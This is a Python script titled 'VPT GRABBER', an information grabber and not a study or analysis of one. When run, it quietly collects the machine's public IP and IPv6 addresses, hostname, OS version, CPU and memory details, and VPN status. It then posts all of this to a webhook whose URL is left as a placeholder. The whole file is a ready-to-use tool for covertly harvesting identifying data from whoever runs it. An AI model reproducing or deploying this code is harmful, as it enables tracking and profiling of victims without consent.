import requests
import json
import platform
import psutil

# Function to check if the IP is from a known VPN provider
def is_vpn(ip):
    # Fetch VPN IP ranges once and store them
    vpn_ips = requests.get("https://raw.githubusercontent.com/Stoltdansker/IP-Grabber/main/vpnip.txt").text.splitlines()
    # Check if the IP starts with any of the known VPN IPs
    return any(ip.startswith(range.split('/')[0]) for range in vpn_ips)

# Function to gather system information
def get_system_info():
    return {
        "sys": platform.system(),
        "node": platform.node(),
        "ver": platform.version(),
        "mach": platform.machine(),
        "proc": platform.processor(),
        "arch": platform.architecture()[0],
        "memory": psutil.virtual_memory(),
        "cpu_cores": psutil.cpu_count(logical=False),
        "logical_cpu_cores": psutil.cpu_count(logical=True),
        "cpu_freq": psutil.cpu_freq().current
    }

# Main function to gather IP and system information
def gather_info():
    ip = requests.get("https://api.ipify.org/").text
    ipv6 = requests.get("https://api64.ipify.org/").text
    sys_info = get_system_info()
    vpn_status = "Active" if is_vpn(ip) else "Not Active"

    return {
        "ip": ip,
        "ipv6": ipv6,
        "vpn_status": vpn_status,
        **sys_info
    }

# Function to create and send the embed
def send_info(webhook, data):
    json_data = {
        "content": "",
        "embeds": [
            {
                "description": (
                    f"**IP Information**📲\nIP: {data['ip']}\nIPV6: {data['ipv6']}\n\n"
                    f"**System Information**🖥\nSystem: {data['sys']}\nHostname: {data['node']}\n"
                    f"Version: {data['ver']}\nMachine: {data['mach']}\nProcessor: {data['proc']}\n"
                    f"Architecture: {data['arch']}\n\n**Memory Information**🧠\n"
                    f"Total Memory: {data['memory'].total / (1024 ** 3):.2f} GB\n"
                    f"Available Memory: {data['memory'].available / (1024 ** 3):.2f} GB\n"
                    f"Used Memory: {data['memory'].used / (1024 ** 3):.2f} GB\n"
                    f"Memory Percentage Used: {data['memory'].percent}%\n\n"
                    f"**CPU Information**❤️\nCPU Cores: {data['cpu_cores']} (Physical)\n"
                    f"Logical CPU Cores: {data['logical_cpu_cores']} (Logical)\n"
                    f"CPU Frequency: {data['cpu_freq']} MHz\n\n"
                    f"**VPN Status**🔒\nVPN: {data['vpn_status']}"
                ),
                "fields": [],
                "title": "VPT GRABBER"
            }
        ],
        "components": [],
        "actions": {}
    }
    
    
    requests.post(webhook, data=json.dumps(json_data), headers={"Content-Type": "application/json"})


# Main execution
webhook = "webhook-url-here"
info = gather_info()
if info:
    send_info(webhook, info)
